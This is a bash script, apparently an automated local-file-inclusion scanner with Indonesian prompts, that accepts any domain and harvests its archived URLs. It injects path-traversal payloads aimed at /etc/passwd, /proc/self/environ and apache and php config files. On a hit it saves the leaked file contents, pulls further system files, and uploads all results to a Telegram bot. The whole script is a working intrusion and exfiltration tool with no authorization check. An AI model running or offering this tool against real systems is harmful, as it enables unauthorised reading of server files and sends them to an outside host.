#!/bin/bash

# Colors
MAGENTA='\033[1;35m'
NC='\033[0m' # No Color
BLUE='\033[1;34m'
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'

payloads=(
    "../../../etc/passwd"
    "../../../etc/passwd%00"
    "....//....//....//etc/passwd"
    "/etc/passwd"
    "../../../../../../etc/passwd"
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    "....//....//....//....//etc/passwd"
    "/proc/self/environ"
    "/etc/apache2/apache2.conf"
    "/usr/local/etc/php/php.ini"
)

# Banner function
display_banner() {
    clear
    echo -e "${BLUE}"
    figlet -w 100 -f small "Single Auto LFI Scanner"
    echo -e "${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Input target function
input_target() {
    clear
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║         Single Auto LFI Scanner          ${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}\n"
    
    while true; do
        echo -e "${YELLOW}[?] Masukkan domain target ${NC}(contoh: example.com)"
        echo -e "${YELLOW}[?] Ketik 'quit' untuk keluar${NC}"
        echo -ne "\n${GREEN}[+] Target Domain: ${NC}"
        read -r input
        
        # Validasi input
        if [[ -z "$input" ]]; then
            echo -e "\n${RED}[!] Error: Domain tidak boleh kosong!${NC}"
            sleep 1
            continue
        elif [[ "$input" == "quit" ]]; then
            echo -e "\n${YELLOW}[!] Keluar dari program...${NC}"
            exit 0
        elif ! [[ "$input" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
            echo -e "\n${RED}[!] Error: Format domain tidak valid!${NC}"
            sleep 1
            continue
        fi
        
        # Jika validasi berhasil
        echo -e "\n${GREEN}[✓] Domain target valid: $input${NC}"
        echo -e "${BLUE}[*] Memulai pemindaian...${NC}\n"
        sleep 1
        domain="$input"  # Set domain variable
        workspace="$input"  # Set workspace variable
        break
    done
    return 0
}

# Create directory structure
setup_workspace() {
    echo -e "\n${BLUE}[+] Setting up workspace...${NC}"
    mkdir -p "$workspace"/{sources,result/{gf,wayback,lfi/responses}}
    echo -e "${GREEN}[✓] Directory structure created${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# WAF detection
check_waf() {
    echo -e "\n${BLUE}[+] Checking Web Application Firewall...${NC}"
    wafw00f "$domain"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Wayback data collection
collect_wayback() {
    echo -e "\n${BLUE}[+] Collecting URLs from Wayback Machine...${NC}"
    echo "https://$domain/" | waybackurls | anew "$workspace/result/wayback/wayback-tmp.txt"
    
    echo -e "${MAGENTA}[*] Filtering relevant URLs...${NC}"
    cat "$workspace/result/wayback/wayback-tmp.txt" 2>/dev/null | \
        egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpeg|\.jpg|\.png|\.css|\.ico" | \
        sed 's/:80//g;s/:443//g' | sort -u > "$workspace/result/wayback/wayback.txt"
    
    rm -f "$workspace/result/wayback/wayback-tmp.txt"
    total_urls=$(wc -l < "$workspace/result/wayback/wayback.txt" 2>/dev/null || echo "0")
    echo -e "${GREEN}[✓] Found $total_urls unique URLs${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# URL validation
validate_urls() {
    echo -e "\n${BLUE}[+] Validating discovered URLs...${NC}"
    if [[ -f "$workspace/result/wayback/wayback.txt" ]]; then
        ffuf -c -u "FUZZ" -w "$workspace/result/wayback/wayback.txt" -of csv -o "$workspace/result/wayback/valid-tmp.txt" \
             -t 100 -rate 1000
        
        cat "$workspace/result/wayback/valid-tmp.txt" 2>/dev/null | grep http | awk -F "," '{print $1}' > "$workspace/result/wayback/valid.txt"
        rm -f "$workspace/result/wayback/valid-tmp.txt"
        
        valid_urls=$(wc -l < "$workspace/result/wayback/valid.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $valid_urls valid URLs${NC}"
    else
        echo -e "${RED}[!] No URLs found to validate${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# GF pattern matching
run_gf_patterns() {
    echo -e "\n${BLUE}[+] Running pattern matching...${NC}"
    
    if [[ ! -f "$workspace/result/wayback/valid.txt" ]]; then
        echo -e "${RED}[!] No valid URLs found for pattern matching${NC}"
        return 1
    fi
    
    patterns=("lfi" "rce" "ssrf" "sqli" "xss" "idor" "debug_logic")
    
    for pattern in "${patterns[@]}"; do
        echo -e "${MAGENTA}[*] Checking for $pattern...${NC}"
        gf "$pattern" "$workspace/result/wayback/valid.txt" 2>/dev/null | tee "$workspace/result/gf/${pattern}.txt"
        count=$(wc -l < "$workspace/result/gf/${pattern}.txt" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Found $count potential $pattern endpoints${NC}"
    done
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Load LFI payloads
load_payloads() {
    CONFIG_FILE="value.txt"
    if [[ -f "$CONFIG_FILE" ]]; then
        echo -e "${BLUE}[+] Loading payloads from value.txt...${NC}"
        mapfile -t payloads < "$CONFIG_FILE"
        total_payloads=${#payloads[@]}
        echo -e "${GREEN}[✓] Loaded $total_payloads payloads${NC}"
    else
        echo -e "${RED}[!] value.txt not found in parent directory${NC}"
        exit 1
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Test single URL with payload replacement
test_url() {
    local url="$1"
    local original_value
    local max_retries=3
    local timeout=10

    # Validate URL format
    if ! echo "$url" | grep -E "^https?://" > /dev/null; then
        echo -e "${YELLOW}[!] Invalid URL format: $url${NC}"
        return 1
    fi

    if echo "$url" | grep -q "="; then
        original_value=$(echo "$url" | cut -d'=' -f2- | cut -d'&' -f1)
        base_url="${url/${original_value}/}"
        
        echo -e "${BLUE}[*] Testing URL: $url${NC}"
        echo -e "${BLUE}[*] Base URL: $base_url${NC}"

        # Create directory for responses if it doesn't exist
        mkdir -p "$workspace/result/lfi/responses"
        
        for payload in "${payloads[@]}"; do
            [[ -z "$payload" ]] && continue
            
            payload=$(echo "$payload" | tr -d '\r' | xargs)
            test_url="${base_url}${payload}"
            
            echo -e "${YELLOW}[*] Testing with payload: $payload${NC}"
            
            # Initialize retry counter
            retries=0
            success=false

            while [ $retries -lt $max_retries ] && [ "$success" = false ]; do
                # Use multiple validation patterns
                response=$(curl -s -L -k \
                    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
                    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
                    -H "Accept-Language: en-US,en;q=0.5" \
                    --max-time $timeout \
                    --retry 3 \
                    --retry-delay 2 \
                    "$test_url" 2>/dev/null)

                if [ $? -eq 0 ]; then
                    success=true
                else
                    retries=$((retries + 1))
                    echo -e "${YELLOW}[!] Request failed, retrying ($retries/$max_retries)${NC}"
                    sleep 2
                fi
            done

            if [ "$success" = false ]; then
                echo -e "${RED}[!] Failed to get response after $max_retries attempts${NC}"
                continue
            fi

            # Enhanced validation patterns
            vulnerable=false
            vulnerability_type=""
            
            # Check for multiple indicators of successful LFI
            if echo "$response" | grep -iPq "root:.*:0:0:|bin:.*:1:1:|daemon:.*:2:2:"; then
                vulnerable=true
                vulnerability_type="passwd file"
            elif echo "$response" | grep -iPq "DocumentRoot|ServerRoot|LoadModule"; then
                vulnerable=true
                vulnerability_type="apache config"
            elif echo "$response" | grep -iPq "\[mysqli\]|\[PHP\]|display_errors|memory_limit"; then
                vulnerable=true
                vulnerability_type="php config"
            fi

            # Validate response size to avoid false positives
            response_size=${#response}
            if [ $response_size -lt 10 ] || [ $response_size -gt 1000000 ]; then 
                vulnerable=false
                echo -e "${YELLOW}[!] Suspicious response size ($response_size bytes), marking as false positive${NC}"
            fi

            if [ "$vulnerable" = true ]; then
                echo -e "${RED}[!] VULNERABLE - Found $vulnerability_type${NC}"
                
                # Generate unique identifier for the vulnerability
                vuln_id=$(echo "${test_url}${vulnerability_type}" | md5sum | cut -d' ' -f1)
                response_file="$workspace/result/lfi/responses/${vuln_id}.txt"
                
                # Save detailed information about the vulnerability
                {
                    echo "-------------------- VULNERABILITY DETAILS --------------------"
                    echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
                    echo "URL: $test_url"
                    echo "Base URL: $base_url"
                    echo "Payload: $payload"
                    echo "Vulnerability Type: $vulnerability_type"
                    echo "Response Size: $response_size bytes"
                    echo "-------------------- RESPONSE HEADERS --------------------"
                    curl -s -I "$test_url" 2>/dev/null
                    echo "-------------------- RESPONSE BODY --------------------"
                    echo "$response"
                    echo "-------------------- END --------------------"
                } > "$response_file"

                # Log the vulnerability
                echo "[VULNERABLE] $test_url - $vulnerability_type" >> "$workspace/result/lfi/vulnerable.txt"
                
                # Try to gather additional system information if possible
                if [ "$vulnerability_type" = "passwd file" ]; then
                    echo -e "${YELLOW}[*] Attempting to gather additional system information...${NC}"
                    
                    # Test for common sensitive files
                    additional_files=("/etc/issue" "/etc/hostname" "/proc/version")
                    for file in "${additional_files[@]}"; do
                        additional_payload="${base_url}${file}"
                        additional_response=$(curl -s -L -k --max-time 5 "$additional_payload")
                        if [ ! -z "$additional_response" ]; then
                            echo "-------------------- Additional File: $file --------------------" >> "$response_file"
                            echo "$additional_response" >> "$response_file"
                        fi
                    done
                fi
            else
                echo -e "${GREEN}[✓] NOT VULNERABLE${NC}"
            fi

            # Add delay between requests to avoid overwhelming the server
            sleep 1
        done
    else
        echo -e "${YELLOW}[!] URL doesn't contain any parameters to test${NC}"
        return 1
    fi
}

# Process all URLs with LFI patterns
process_urls() {
    echo -e "\n${BLUE}[+] Starting URL processing...${NC}"
    
    if [[ ! -f "$workspace/result/gf/lfi.txt" ]]; then
        echo -e "${RED}[!] No URLs found for testing${NC}"
        return
    fi
    
    total_urls=$(wc -l < "$workspace/result/gf/lfi.txt")
    current=0
    
    while IFS= read -r url; do
        ((current++))
        echo -e "\n${BLUE}[*] Processing URL ($current/$total_urls)${NC}"
        test_url "$url"
    done < "$workspace/result/gf/lfi.txt"
    
    echo -e "${GREEN}[✓] URL processing completed${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Generate summary report
generate_report() {
    echo -e "\n${BLUE}[+] Generating summary report...${NC}"
    
    report_file="$workspace/result/lfi/summary_report.txt"
    
    {
        echo "LFI Vulnerability Scan Report"
        echo "============================"
        echo "Date: $(date)"
        echo "Target Domain: $domain"
        echo ""
        echo "Scan Statistics:"
        echo "---------------"
        echo "Total URLs Scanned: $total_urls"
        echo "Payloads Used: ${#payloads[@]}"
        echo ""
        echo "Findings:"
        echo "---------"
        if [[ -f "$workspace/result/lfi/vulnerable.txt" ]]; then
            vuln_count=$(wc -l < "$workspace/result/lfi/vulnerable.txt")
            echo "Vulnerable URLs Found: $vuln_count"
            echo ""
            echo "Vulnerable Endpoints:"
            cat "$workspace/result/lfi/vulnerable.txt"
        else
            echo "No vulnerabilities found"
        fi
    } > "$report_file"
    
    echo -e "${GREEN}[✓] Report generated: $report_file${NC}"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Send results to Telegram
send_to_telegram() {
    if [[ -f telegram_token.txt && -f telegram_chat_id.txt ]]; then
        echo -e "\n${BLUE}[+] Sending results to Telegram...${NC}"
        
        token=$(cat telegram_token.txt)
        chat_id=$(cat telegram_chat_id.txt)
        
        message="🔍 LFI scan completed for: $domain
📊 Summary:
• Total URLs: $(wc -l < "$workspace/result/wayback/wayback.txt" 2>/dev/null || echo "0")
• Valid URLs: $(wc -l < "$workspace/result/wayback/valid.txt" 2>/dev/null || echo "0")
• Vulnerable URLs: $(wc -l < "$workspace/result/lfi/vulnerable.txt" 2>/dev/null || echo "0")
📤 Sending detailed results..."

        curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" \
             -d chat_id="$chat_id" \
             -d text="$message" > /dev/null 2>&1

        find "$workspace" -type f | while read -r file; do
            echo -e "${MAGENTA}[*] Sending: $(basename "$file")${NC}"
            curl -s -F chat_id="$chat_id" \
                 -F document=@"$file" \
                 "https://api.telegram.org/bot$token/sendDocument" > /dev/null 2>&1
        done

        echo -e "${GREEN}[✓] Results sent to Telegram${NC}"
    else
        echo -e "${RED}[!] Telegram credentials not found${NC}"
    fi
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# Main execution
main() {
    display_banner
    input_target
    setup_workspace
    check_waf
    collect_wayback
    validate_urls
    run_gf_patterns
    load_payloads
    process_urls
    generate_report
    send_to_telegram
    echo -e "\n${GREEN}[✓] LFI scan completed successfully!${NC}\n"
}

# Run the script
main